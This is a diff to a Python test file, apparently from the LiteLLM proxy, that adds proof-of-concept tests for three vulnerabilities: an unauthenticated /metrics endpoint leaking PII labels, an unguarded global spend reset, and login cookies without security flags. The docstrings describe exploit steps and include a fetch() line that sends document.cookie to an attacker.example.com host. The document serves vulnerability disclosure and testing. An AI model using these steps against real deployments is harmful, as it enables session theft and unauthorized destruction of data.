@@ -1,5 +1,5 @@
 """
-Security PoC tests demonstrating eight vulnerabilities.
+Security PoC tests demonstrating eleven vulnerabilities.
 
 Vulnerability 1: MCP .well-known query-string auth bypass
 Vulnerability 2: Unauthenticated /debug/asyncio-tasks endpoint
@@ -9,10 +9,14 @@ Vulnerability 5: IDOR on /user/info v1 endpoint
 Vulnerability 6: /spend/keys leaks all API keys to any authenticated user
 Vulnerability 7: MCP OAuth metadata SSRF via WWW-Authenticate header
 Vulnerability 8: Unauthenticated /token endpoint + token_url SSRF
+Vulnerability 9: Unauthenticated /metrics endpoint exposes PII labels
+Vulnerability 10: /global/spend/reset missing admin gate
+Vulnerability 11: Login cookies missing httponly/secure/samesite flags
 """
 
 import inspect
 import os
+import pathlib
 import secrets
 import sys
 from types import ModuleType
@@ -41,8 +45,13 @@ from litellm.proxy.management_endpoints.internal_user_endpoints import (
     _check_user_info_v2_access,
     user_info,
 )
-from litellm.proxy.spend_tracking.spend_management_endpoints import spend_key_fn
+from litellm.proxy.spend_tracking.spend_management_endpoints import (
+    global_spend_reset,
+    router as spend_mgmt_router,
+    spend_key_fn,
+)
 from litellm.proxy.spend_tracking.spend_tracking_utils import _is_master_key
+from litellm.types.integrations.prometheus import UserAPIKeyLabelNames
 
 EXPLOIT_PATH = "/v1/mcp/tools"
 EXPLOIT_QUERY = b"x=.well-known"
@@ -1540,3 +1549,387 @@ class TestUnauthenticatedTokenEndpointSSRF:
         assert "async_safe_get" not in source, (
             "exchange_token_with_server must not call async_safe_get — SSRF protection is absent"
         )
+
+
+class TestUnauthenticatedMetricsEndpoint:
+    """
+    PoC tests proving the /metrics Prometheus endpoint is mounted with zero
+    authentication and exposes sensitive PII labels (Vulnerability 9).
+
+    Vulnerability description:
+        ``PrometheusLogger._mount_metrics_endpoint()`` calls ``app.mount("/metrics",
+        metrics_app)`` with no authentication middleware or dependency.  The debug log
+        message explicitly says "no authentication", confirming the developers knew the
+        endpoint was unprotected.
+
+        Once reachable, the Prometheus metrics expose labels defined in
+        ``UserAPIKeyLabelNames`` that include PII: hashed API keys, user e-mail
+        addresses, team identifiers, API base URLs, end-user IDs, and key aliases.
+        Any network-adjacent observer can scrape the /metrics endpoint and exfiltrate
+        this PII without supplying any credentials.
+
+    Severity: High - Unauthenticated PII Disclosure
+    Status: CONFIRMED ACTIVE
+    """
+
+    def test_metrics_endpoint_mounted_without_auth(self):
+        """
+        Proves the /metrics endpoint is mounted with no authentication.
+
+        Exploit:
+            GET /metrics  (no Authorization header)
+
+        Uses ``inspect.getsource`` on ``_mount_metrics_endpoint`` to verify:
+        1. The source contains ``app.mount("/metrics", metrics_app)`` — it is mounted.
+        2. The source does NOT contain ``user_api_key_auth``, ``Depends``, or any
+           authentication reference — there is no auth gate.
+        3. The log string ``"no authentication"`` is present, confirming the developers
+           knew the endpoint was unprotected.
+
+        Impact:
+            Any unauthenticated client with network access to the proxy port can scrape
+            ``/metrics`` and retrieve all Prometheus time-series data, including PII
+            labels defined in ``UserAPIKeyLabelNames``.
+
+        Severity: High - Unauthenticated Endpoint
+        Status: CONFIRMED ACTIVE
+        """
+        try:
+            from litellm.integrations.prometheus import PrometheusLogger
+        except ImportError:
+            pytest.skip("prometheus_client not installed")
+
+        source = inspect.getsource(PrometheusLogger._mount_metrics_endpoint)
+
+        assert 'app.mount("/metrics", metrics_app)' in source, (
+            "Source must contain app.mount('/metrics', metrics_app) — endpoint is mounted"
+        )
+        assert "user_api_key_auth" not in source, (
+            "Source must NOT contain 'user_api_key_auth' — no authentication is present"
+        )
+        assert "Depends" not in source, (
+            "Source must NOT contain 'Depends' — no FastAPI auth dependency is present"
+        )
+        assert "no authentication" in source, (
+            "Source must contain the 'no authentication' log string — "
+            "confirming the developers documented the unprotected state"
+        )
+
+    def test_metrics_exposes_sensitive_labels(self):
+        """
+        Proves the /metrics endpoint exposes PII in its Prometheus labels.
+
+        ``UserAPIKeyLabelNames`` defines the set of label names attached to every
+        Prometheus counter and histogram emitted by the LiteLLM proxy.  Each of the
+        following labels leaks sensitive information to any /metrics scraper:
+
+        - ``hashed_api_key``  — unique identifier for each API key (linkable to user)
+        - ``user_email``      — user PII, directly identifiable
+        - ``team``            — organisation structure disclosure
+        - ``api_base``        — provider endpoint URLs, reveals backend infrastructure
+        - ``end_user``        — end-user identifier passed by the caller
+        - ``api_key_alias``   — human-readable key name, may include account info
+
+        Impact:
+            A single unauthenticated scrape of /metrics leaks the above PII for every
+            API call made through the proxy.  Combined with the unprotected mount
+            proven in ``test_metrics_endpoint_mounted_without_auth``, this constitutes
+            a complete unauthenticated PII disclosure vulnerability.
+
+        Severity: High - PII Leakage via Unauthenticated Prometheus Labels
+        Status: CONFIRMED ACTIVE
+        """
+        label_values = {member.value for member in UserAPIKeyLabelNames}
+
+        assert "hashed_api_key" in label_values, (
+            "UserAPIKeyLabelNames must include 'hashed_api_key' — "
+            "leaks a unique fingerprint of every API key to /metrics scrapers"
+        )
+        assert "user_email" in label_values, (
+            "UserAPIKeyLabelNames must include 'user_email' — "
+            "directly identifiable PII exposed on every metric data point"
+        )
+        assert "team" in label_values, (
+            "UserAPIKeyLabelNames must include 'team' — "
+            "organisation structure and team membership is disclosed"
+        )
+        assert "api_base" in label_values, (
+            "UserAPIKeyLabelNames must include 'api_base' — "
+            "backend provider endpoint URLs leaked, revealing infrastructure"
+        )
+        assert "end_user" in label_values, (
+            "UserAPIKeyLabelNames must include 'end_user' — "
+            "caller-supplied end-user identifier is attached to every metric"
+        )
+        assert "api_key_alias" in label_values, (
+            "UserAPIKeyLabelNames must include 'api_key_alias' — "
+            "human-readable key name may contain account or role information"
+        )
+
+
+class TestGlobalSpendResetMissingAdminGate:
+    """
+    PoC tests proving the /global/spend/reset endpoint accepts any authenticated
+    user — there is no admin role check (Vulnerability 10).
+
+    Vulnerability description:
+        The ``global_spend_reset()`` function in ``spend_management_endpoints.py``
+        is decorated with ``dependencies=[Depends(user_api_key_auth)]``, meaning any
+        valid API key passes authentication.  However, the function signature has no
+        ``user_api_key_dict`` parameter, so the caller's role is structurally
+        unavailable inside the function body.
+
+        The docstring says "ADMIN ONLY / MASTER KEY Only Endpoint", but no admin check
+        is performed.  Any authenticated user can call the endpoint and zero the spend
+        counters for ALL API keys and ALL teams across the entire LiteLLM installation.
+
+    Severity: High - Missing Authorization (Privilege Escalation / Destructive Action)
+    Status: CONFIRMED ACTIVE
+    """
+
+    def test_no_admin_dependency_on_route(self):
+        """
+        Structural proof that the route has authentication but no admin gate.
+
+        Exploit:
+            POST /global/spend/reset
+            Authorization: Bearer sk-any-valid-key  (INTERNAL_USER role sufficient)
+
+        Uses ``inspect`` to verify:
+        1. ``router.routes`` contains the ``/global/spend/reset`` route with at least
+           one dependency (``user_api_key_auth``) — authentication IS present.
+        2. The route-level dependencies do NOT include any admin check function.
+        3. ``inspect.signature(global_spend_reset)`` has no ``user_api_key_dict``
+           parameter — the function structurally cannot access the caller's role.
+        4. ``inspect.getsource(global_spend_reset)`` contains no ``user_role``,
+           ``PROXY_ADMIN``, or ``_is_admin_view_safe`` — no admin check in the body.
+
+        Impact:
+            Any user who can obtain a valid LiteLLM API key (e.g. via the /spend/keys
+            IDOR in Vulnerability 6) can POST to /global/spend/reset and zero the spend
+            for every key and team, bypassing budget limits and audit controls.
+
+        Severity: High - Missing Authorization
+        Status: CONFIRMED ACTIVE
+        """
+        reset_routes = [
+            route
+            for route in spend_mgmt_router.routes
+            if hasattr(route, "path") and route.path == "/global/spend/reset"  # type: ignore[union-attr]
+        ]
+
+        assert len(reset_routes) == 1, (
+            f"Expected exactly one /global/spend/reset route, found {len(reset_routes)}"
+        )
+
+        route = reset_routes[0]
+        route_deps = getattr(route, "dependencies", [])
+        assert len(route_deps) > 0, (
+            "/global/spend/reset must have at least one dependency (user_api_key_auth) — "
+            "authentication is present but no admin check"
+        )
+
+        dep_callables = [d.dependency for d in route_deps if hasattr(d, "dependency")]
+        assert user_api_key_auth in dep_callables, (
+            "user_api_key_auth must be a route-level dependency — authentication exists"
+        )
+
+        sig = inspect.signature(global_spend_reset)
+        assert "user_api_key_dict" not in sig.parameters, (
+            f"global_spend_reset must not have a user_api_key_dict parameter — "
+            f"caller's role is structurally unavailable. "
+            f"Parameters found: {list(sig.parameters.keys())}"
+        )
+
+        source = inspect.getsource(global_spend_reset)
+        assert "user_role" not in source, (
+            "global_spend_reset source must not contain 'user_role' — no role check is performed"
+        )
+        assert "PROXY_ADMIN" not in source, (
+            "global_spend_reset source must not contain 'PROXY_ADMIN' — no admin check is performed"
+        )
+        assert "_is_admin_view_safe" not in source, (
+            "global_spend_reset source must not reference '_is_admin_view_safe' — "
+            "no admin verification helper is called"
+        )
+
+    @pytest.mark.asyncio
+    async def test_non_admin_can_reset_all_spend(self):
+        """
+        Proves that calling ``global_spend_reset()`` with a mocked DB zeroes all spend.
+
+        Exploit:
+            POST /global/spend/reset  (any valid API key, no admin role required)
+
+        The function takes no arguments — it cannot distinguish admin from non-admin.
+        This test calls it directly with a mocked ``prisma_client`` and asserts that
+        ``update_many`` is called on both ``litellm_verificationtoken`` and
+        ``litellm_teamtable`` with ``data={"spend": 0.0}, where={}``.
+
+        Impact:
+            Any authenticated user can zero all spend counters for all API keys and all
+            teams.  This erases budget tracking, enables bypass of exhausted budgets,
+            and constitutes a destructive action affecting the entire LiteLLM installation.
+
+        Severity: High - Missing Authorization / Destructive Action
+        Status: CONFIRMED ACTIVE
+        """
+        mock_db = MagicMock()
+        mock_db.litellm_verificationtoken = MagicMock()
+        mock_db.litellm_verificationtoken.update_many = AsyncMock(return_value=None)
+        mock_db.litellm_teamtable = MagicMock()
+        mock_db.litellm_teamtable.update_many = AsyncMock(return_value=None)
+
+        mock_prisma = MagicMock()
+        mock_prisma.db = mock_db
+
+        fake_proxy_server = _make_proxy_server_module(mock_prisma)
+        with patch.dict(sys.modules, {"litellm.proxy.proxy_server": fake_proxy_server}):
+            result = await global_spend_reset()
+
+        mock_db.litellm_verificationtoken.update_many.assert_called_once_with(
+            data={"spend": 0.0}, where={}
+        )
+        mock_db.litellm_teamtable.update_many.assert_called_once_with(
+            data={"spend": 0.0}, where={}
+        )
+
+        assert result is not None, "global_spend_reset must return a response"
+        assert result.get("status") == "success", (
+            f"Response must indicate success — any authenticated caller zeroed all spend. "
+            f"Got: {result!r}"
+        )
+
+
+class TestLoginCookieMissingSecurityFlags:
+    """
+    PoC tests proving the login endpoints set cookies without httponly, secure, or
+    samesite flags (Vulnerability 11).
+
+    Vulnerability description:
+        Three login endpoints in ``proxy_server.py`` call ``response.set_cookie(key="token",
+        value=jwt_token)`` with no security flags:
+
+        - ``/login``           (line ~11607)
+        - ``/v2/login``        (line ~11659)
+        - ``/v3/login/exchange`` (line ~11827)
+
+        Without ``httponly=True``, JavaScript running in the browser can read the JWT
+        from ``document.cookie``.  Any XSS vulnerability — in the LiteLLM UI or any
+        third-party script loaded by it — can exfiltrate the session token.
+
+        Without ``secure=True``, the cookie is transmitted over plain HTTP connections,
+        enabling session theft via network interception (e.g. on a shared network).
+
+        Without ``samesite=``, the cookie is sent on cross-site requests, enabling
+        CSRF attacks that use the victim's session without their consent.
+
+    Severity: High - Session Hijacking via XSS / Network Interception / CSRF
+    Status: CONFIRMED ACTIVE
+    """
+
+    def test_set_cookie_calls_lack_security_flags(self):
+        """
+        Static proof that all ``set_cookie`` calls in the login functions lack flags.
+
+        Exploit:
+            1. Inject JavaScript via any XSS vector in the LiteLLM UI.
+            2. Read ``document.cookie`` — the JWT session token is accessible because
+               ``httponly`` is absent.
+            3. Exfiltrate the token to an attacker-controlled server.
+            4. Replay the token to gain full admin access to the proxy.
+
+        Reads ``proxy_server.py`` with ``pathlib.Path`` and locates every line
+        containing ``set_cookie(``.  For each such line asserts:
+        - ``httponly`` is absent
+        - ``secure`` is absent
+        - ``samesite`` is absent
+
+        Impact:
+            Any XSS in the dashboard results in immediate, permanent session token theft
+            for every user who logs in while the attacker's script is active.
+
+        Severity: High - XSS Session Hijacking
+        Status: CONFIRMED ACTIVE
+        """
+        proxy_server_path = pathlib.Path(__file__).parent.parent.parent.parent.parent / "litellm" / "proxy" / "proxy_server.py"
+        source_lines = proxy_server_path.read_text(encoding="utf-8").splitlines()
+
+        set_cookie_lines = [
+            (line_no + 1, line)
+            for line_no, line in enumerate(source_lines)
+            if "set_cookie(" in line
+        ]
+
+        assert len(set_cookie_lines) > 0, (
+            "proxy_server.py must contain at least one set_cookie() call in the login functions"
+        )
+
+        for line_no, line in set_cookie_lines:
+            assert "httponly" not in line.lower(), (
+                f"Line {line_no}: set_cookie call must NOT contain 'httponly' — "
+                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
+            )
+            assert "secure" not in line.lower(), (
+                f"Line {line_no}: set_cookie call must NOT contain 'secure' — "
+                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
+            )
+            assert "samesite" not in line.lower(), (
+                f"Line {line_no}: set_cookie call must NOT contain 'samesite' — "
+                f"this would indicate the vulnerability is fixed. Line: {line.strip()!r}"
+            )
+
+    def test_cookie_security_flags_absent_from_all_login_endpoints(self):
+        """
+        Detailed proof: all three login endpoint ``set_cookie`` calls lack security flags.
+
+        Reads ``proxy_server.py`` and extracts the ``set_cookie`` calls from the three
+        login function blocks.  Asserts each call is missing ``httponly=True``,
+        ``secure=True``, and ``samesite=`` parameters.
+
+        Login endpoints checked:
+        - ``/login``             — redirect-based flow (line ~11607)
+        - ``/v2/login``          — JSON response flow (line ~11659)
+        - ``/v3/login/exchange`` — single-use code exchange (line ~11827)
+
+        XSS impact:
+            Without ``httponly=True``, any JavaScript injected via XSS can execute:
+
+                fetch('https://attacker.example.com/steal?token=' + document.cookie)
+
+            and exfiltrate the JWT to the attacker.  The attacker can then replay the
+            JWT to gain the full permissions of the victim's session — including PROXY_ADMIN
+            if the victim is an administrator.
+
+        Severity: High - XSS Session Token Theft / CSRF
+        Status: CONFIRMED ACTIVE
+        """
+        proxy_server_path = pathlib.Path(__file__).parent.parent.parent.parent.parent / "litellm" / "proxy" / "proxy_server.py"
+        source_text = proxy_server_path.read_text(encoding="utf-8")
+        source_lines = source_text.splitlines()
+
+        login_set_cookie_lines = [
+            (line_no + 1, line)
+            for line_no, line in enumerate(source_lines)
+            if "set_cookie(" in line and "token" in line
+        ]
+
+        assert len(login_set_cookie_lines) >= 3, (
+            f"Expected at least 3 set_cookie calls with 'token' in proxy_server.py "
+            f"(one per login endpoint), found {len(login_set_cookie_lines)}"
+        )
+
+        for line_no, line in login_set_cookie_lines:
+            stripped = line.strip()
+            assert "httponly=True" not in stripped, (
+                f"Line {line_no}: set_cookie must NOT have httponly=True — "
+                f"JavaScript can read the JWT from document.cookie. Line: {stripped!r}"
+            )
+            assert "secure=True" not in stripped, (
+                f"Line {line_no}: set_cookie must NOT have secure=True — "
+                f"cookie is transmitted over plain HTTP. Line: {stripped!r}"
+            )
+            assert "samesite=" not in stripped.lower(), (
+                f"Line {line_no}: set_cookie must NOT have samesite= — "
+                f"cookie is sent on cross-site requests (CSRF risk). Line: {stripped!r}"
+            )
